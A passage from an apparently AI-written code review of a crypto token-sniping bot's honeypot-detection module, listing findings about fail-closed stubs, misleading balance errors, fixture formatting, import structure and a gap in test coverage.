The stub returns `verdict: 'unknown'` with `reason: 'NOT_IMPLEMENTED: ...'`. This is correct fail-closed behavior, but a caller (e.g., the dispatcher) cannot distinguish "stubbed" from "real" via the return value. If an operator sets `method: 'eth_simulateV1'` in some future overlay, the bot silently treats every snipe as unsafe with the NOT_IMPLEMENTED reason.

**Fix:**
At chain registry build time, validate that `method === 'eth_simulateV1'` is not enabled (since it's stubbed):
```typescript
if (isEnabled && template.honeypotMethod === 'eth_simulateV1') {
    log.fatal({ chain: chainName }, 'eth_simulateV1 method is stubbed (Phase 18) — set method=on-chain-contract');
    process.exit(1);
}
```

### IN-06: `provider.call({ value: amountWei, ... })` requires wallet balance ≥ amountIn — silent failure for under-funded operators

**File:** `src/utils/honeypot/checkerContract.ts:256-261`, `:341-346`
**Issue:**
`provider.call` with `from: ctx.wallet.address, value: amountWei` requires the live wallet balance to be ≥ `amountWei` for the simulated call. On free-tier Alchemy / Infura endpoints that enforce strict balance checking, an operator with low ETH balance gets RPC errors that flow into the outer catch as `verdict: 'unsafe'`. Every token gets blocked, but the operator's logs show "honeypot detected" — masking the real "insufficient balance" diagnostic.

**Fix:**
At startup (chain context creation in `createChainContext`), warn if `ctx.wallet.balance < snipeAmount × 100` (100× safety margin for the probes). Surface this as a Telegram alert + dashboard warning so the operator knows the gate is going to fail-closed on every candidate.

### IN-07: `mythril/sample-clean.json` and `sample-high.json` lack JSON closing newlines

**File:** `test/fixtures/mythril/sample-clean.json:1`, `sample-high.json:1`
**Issue:**
Single-line JSON files without trailing newlines. POSIX convention recommends trailing newlines for text files. Some tools (`cat`, `wc -l`, `git diff`) misbehave on no-newline files.

**Fix:**
Add trailing newlines (cosmetic).

## Structural Findings (fallow)

No structural findings provided by the workflow for this review. The cross-module analysis was performed inline during the deep review; key observations:

- **Import graph (clean):** `simulateHoneypotRoundtrip` is imported only by `src/bot.ts` (lines 31, 232, 459). `isMutableTokenForChain` is imported only by `src/bot.ts` (lines 36, 270, 496). The dispatch entry point has a single consumer.
- **`HoneypotResult` discriminated union (verified):** The type at `src/utils/honeypot/types.ts:51-65` correctly enforces `buyTaxBps: number` and `sellTaxBps: number` on the `safe` variant. The narrowing at `bot.ts:307` and `:516` correctly produces the tightened type.
- **Fail-closed propagation (verified for V2 path):** A `verdict: 'unknown'` (e.g., when `deployedAddress: null`) flows through `bot.ts:233` `verdict !== 'safe'` early-return → buy is blocked. See CR-01 for the operational implication (BSC/Base/Arb hard-block).
- **No circular dependencies introduced:** Phase 18's new module `src/utils/honeypot/` is leaf-only; nothing imports back to `chainRegistry` (only type imports). The `re-export` of `HoneypotCheckerConfig` from `chainRegistry.ts` is type-only.
- **Test coverage gap on V3 path:** The fork test (`test/fork/honeypotChecker.fork.test.ts`) does not actively exercise the real V3 sell path against a real-mainnet V3 honeypot (`tokenAddress: null` in the fixture). This is acknowledged in the fixture README but is a real coverage gap.

---

_Reviewed: 2026-05-23T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
